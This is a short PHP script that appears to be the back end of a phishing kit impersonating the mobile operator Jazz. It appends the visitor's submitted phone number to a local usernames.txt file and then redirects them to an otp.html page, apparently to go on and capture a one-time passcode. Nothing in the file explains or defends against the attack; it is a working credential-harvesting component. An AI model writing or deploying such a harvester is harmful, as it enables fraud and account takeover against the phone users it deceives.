<?php

file_put_contents("usernames.txt", "Jazz Phone Number : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
